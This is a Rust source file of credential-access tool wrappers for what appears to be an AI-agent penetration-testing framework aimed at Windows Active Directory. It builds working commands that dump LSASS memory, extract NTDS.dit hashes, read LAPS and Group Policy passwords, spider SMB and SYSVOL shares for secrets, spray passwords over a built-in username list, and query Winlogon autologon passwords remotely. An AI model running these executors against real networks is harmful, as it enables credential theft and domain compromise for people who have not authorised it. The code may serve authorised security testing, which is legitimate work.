//! Miscellaneous credential access tool executors (lsassy, domain admin
//! checker, GPP, SYSVOL, LAPS, LDAP descriptions, SMB spider, NTDS,
//! password policy, password spray, username-as-password, credman, autologon).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Dump LSASS credentials remotely via `lsassy`.
pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;
    let method = optional_str(args, "method");

    let mut cmd = CommandBuilder::new("lsassy")
        .flag_opt("-d", domain)
        .flag("-u", username);

    if let Some(h) = hash {
        let h = if h.contains(':') {
            h.to_string()
        } else {
            format!(":{h}")
        };
        cmd = cmd.flag("-H", h);
    } else if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }

    cmd = cmd.arg(target);
    cmd = cmd.flag_opt("-m", method);

    cmd.timeout_secs(120).execute().await
}

/// Check for admin access on targets via `netexec smb --admin-status`.
pub async fn domain_admin_checker(args: &Value) -> Result<ToolOutput> {
    let targets = required_str(args, "targets")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let cred_args = credentials::netexec_creds(username, password, hash, domain);

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(targets)
        .args(cred_args)
        .arg("--admin-status")
        .timeout_secs(120)
        .execute()
        .await
}

/// Search for Group Policy Preferences passwords via `netexec smb -M gpp_autologin`.
pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "gpp_password")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spider SYSVOL for scripts and config files via `netexec smb -M spider_plus`.
///
/// After the spider runs, reads downloaded text files and appends their contents
/// to the output so the agent can search for embedded credentials.
pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let mut output = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400")
        .timeout_secs(300)
        .execute()
        .await?;

    // Append downloaded file contents (same logic as smbclient_spider)
    let extra = read_spider_downloads(target).await;
    if !extra.is_empty() {
        output.stdout.push_str(&extra);
    }

    Ok(output)
}

/// Dump LAPS passwords via `netexec ldap -M laps`.
pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(target)
        .args(cred_args)
        .flag("-M", "laps")
        .timeout_secs(120)
        .execute()
        .await
}

/// Search for user descriptions containing credentials via `ldapsearch`.
pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let base_dn = optional_str(args, "base_dn");

    // Build base DN from domain if not explicitly provided.
    let computed_base_dn = match base_dn {
        Some(dn) => dn.to_string(),
        None => domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(","),
    };

    let bind_dn = format!("{username}@{domain}");
    let ldap_uri = format!("ldap://{target}");

    CommandBuilder::new("ldapsearch")
        .arg("-x")
        .flag("-H", &ldap_uri)
        .flag("-D", &bind_dn)
        .flag("-w", password)
        .flag("-b", &computed_base_dn)
        .arg("(&(objectClass=user)(description=*))")
        .arg("sAMAccountName")
        .arg("description")
        .arg("userPrincipalName")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spider SMB shares for interesting files via `netexec smb -M spider_plus`.
///
/// After the spider runs, reads the metadata JSON and any downloaded text files,
/// appending their contents to the output so the agent can see actual file data.
pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let pattern = optional_str(args, "pattern");
    let depth = optional_i64(args, "depth");

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let mut opts = "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400".to_string();
    if let Some(p) = pattern {
        opts.push_str(&format!(" PATTERN={p}"));
    }
    if let Some(d) = depth {
        opts.push_str(&format!(" DEPTH={d}"));
    }

    let mut output = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", &opts)
        .timeout_secs(300)
        .execute()
        .await?;

    // Append downloaded file contents
    let extra = read_spider_downloads(target).await;
    if !extra.is_empty() {
        output.stdout.push_str(&extra);
    }

    Ok(output)
}

/// Read spider_plus downloaded files and metadata, returning text to append to output.
///
/// spider_plus saves metadata to `/root/.nxc/modules/nxc_spider_plus/{ip}.json`
/// and downloads files to `/root/.nxc/modules/nxc_spider_plus/{ip}/`.
async fn read_spider_downloads(target: &str) -> String {
    let spider_dir = format!("/root/.nxc/modules/nxc_spider_plus/{target}");
    let metadata_path = format!("{spider_dir}.json");

    let mut extra = String::new();

    // Include metadata JSON (file listing per share)
    if let Ok(meta) = tokio::fs::read_to_string(&metadata_path).await {
        extra.push_str("\n\n=== Spider Metadata (files found per share) ===\n");
        extra.push_str(&meta);
    }

    // Walk the download directory and include text file contents
    if tokio::fs::metadata(&spider_dir).await.is_err() {
        return extra;
    }

    extra.push_str("\n\n=== Downloaded File Contents ===\n");
    let mut files_read = 0usize;
    let mut dirs_to_walk = vec![spider_dir.clone()];

    const TEXT_EXTS: &[&str] = &[
        "txt",
        "xml",
        "ini",
        "conf",
        "cfg",
        "ps1",
        "bat",
        "cmd",
        "vbs",
        "js",
        "py",
        "sh",
        "json",
        "yaml",
        "yml",
        "csv",
        "log",
        "reg",
        "inf",
        "pol",
        "asp",
        "aspx",
        "config",
        "properties",
    ];

    while let Some(dir) = dirs_to_walk.pop() {
        let mut dir_entries = match tokio::fs::read_dir(&dir).await {
            Ok(e) => e,
            Err(_) => continue,
        };
        while let Ok(Some(entry)) = dir_entries.next_entry().await {
            let path = entry.path();
            if path.is_dir() {
                dirs_to_walk.push(path.to_string_lossy().to_string());
                continue;
            }
            let ext = path
                .extension()
                .and_then(|e| e.to_str())
                .unwrap_or("")
                .to_lowercase();
            if !TEXT_EXTS.contains(&ext.as_str()) {
                continue;
            }
            if let Ok(contents) = tokio::fs::read_to_string(&path).await {
                // Skip empty files — SYSVOL often has many 0-byte .txt
                // placeholders that fill the file cap before reaching
                // high-value scripts (secret.ps1, etc.)
                if contents.is_empty() {
                    continue;
                }
                let rel = path
                    .strip_prefix(&spider_dir)
                    .unwrap_or(&path)
                    .to_string_lossy();
                extra.push_str(&format!("\n--- {rel} ---\n"));
                // Cap per-file output at 8KB to avoid blowing up context
                if contents.len() > 8192 {
                    let mut end = 8192;
                    while !contents.is_char_boundary(end) {
                        end -= 1;
                    }
                    extra.push_str(&contents[..end]);
                    extra.push_str("\n... [truncated]\n");
                } else {
                    extra.push_str(&contents);
                }
                files_read += 1;
                if files_read >= 50 {
                    extra.push_str("\n... [50 file limit reached, remaining files omitted]\n");
                    break;
                }
            }
        }
        if files_read >= 50 {
            break;
        }
    }

    extra
}

/// Extract NTDS.dit secrets via `impacket-secretsdump -ntds drsuapi`.
pub async fn ntds_dit_extract(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;

    let (auth_string, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-secretsdump")
        .arg("-ntds")
        .arg("drsuapi")
        .args(extra_args)
        .arg(&auth_string)
        .timeout_secs(180)
        .execute()
        .await
}

/// Retrieve the domain password policy via `netexec smb --pass-pol`.
pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .arg("--pass-pol")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spray a single password across a user list via `netexec smb`.
pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = optional_str(args, "users_file");
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let delay_seconds = optional_i64(args, "delay_seconds");

    // Use provided file or generate a default wordlist
    let tmp_file;
    let wordlist_path = if let Some(uf) = users_file {
        uf.to_string()
    } else {
        tmp_file = format!("/tmp/spray_pw_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_SPRAY_USERNAMES)?;
        tmp_file
    };

    let cred_args = credentials::netexec_creds(None, Some(password), None, Some(domain));

    let result = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", &wordlist_path)
        .args(cred_args)
        .arg("--continue-on-success")
        .flag_opt("--jitter", delay_seconds.map(|d| d.to_string()))
        .timeout_secs(300)
        .execute()
        .await;

    // Clean up temp file if we created one
    if users_file.is_none() {
        let _ = std::fs::remove_file(&wordlist_path);
    }

    result
}

/// Common AD usernames for fallback when no users_file is provided.
const DEFAULT_SPRAY_USERNAMES: &str = "\
Administrator\nadmin\nguest\n\
sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
svc_backup\nbackup\n\
svc_web\nwebservice\n\
svc_iis\niis_svc\n\
svc_exchange\nexchange\n\
svc_admin\nsvc_test\n\
testuser\ntest\n\
user1\nuser2\nuser3\n\
sam.wilson\njohn.smith\njohn.smith\n\
alice.jones\nsarah.connor\nbrian.davis\nedward.davis\n\
carol.lane\njames.lane\ntim.lane\n\
diana.torres\njoe.morgan\n\
steve.baker\nrichard.baker\n\
jdoe\nrobert.davis\ntom.green\n\
michelle\nkarl.davidson\nvictor.torres\n\
jeff.baker\ntony.baker\n\
petyr.baelish\nvarys\nbronn\n\
sql_admin\ndb_admin\n\
webadmin\nnetadmin\n\
helpdesk\nsupport\nservice\n";

/// Test each username as its own password via `netexec smb --no-bruteforce`.
pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = optional_str(args, "users_file");
    let domain = required_str(args, "domain")?;

    // Use provided file or generate a default wordlist
    let tmp_file;
    let wordlist_path = if let Some(uf) = users_file {
        uf.to_string()
    } else {
        tmp_file = format!("/tmp/spray_users_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_SPRAY_USERNAMES)?;
        tmp_file
    };

    let result = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", &wordlist_path)
        .flag("-p", &wordlist_path)
        .flag("-d", domain)
        .arg("--no-bruteforce")
        .arg("--continue-on-success")
        .timeout_secs(300)
        .execute()
        .await;

    // Clean up temp file if we created one
    if users_file.is_none() {
        let _ = std::fs::remove_file(&wordlist_path);
    }

    result
}

/// Enumerate Credential Manager entries via `netexec smb -x "cmdkey /list"`.
pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-x", "cmdkey /list")
        .timeout_secs(120)
        .execute()
        .await
}

/// Query Winlogon autologon registry values via `netexec smb -x "reg query"`.
pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let reg_cmd = r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword"#;

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-x", reg_cmd)
        .timeout_secs(120)
        .execute()
        .await
}
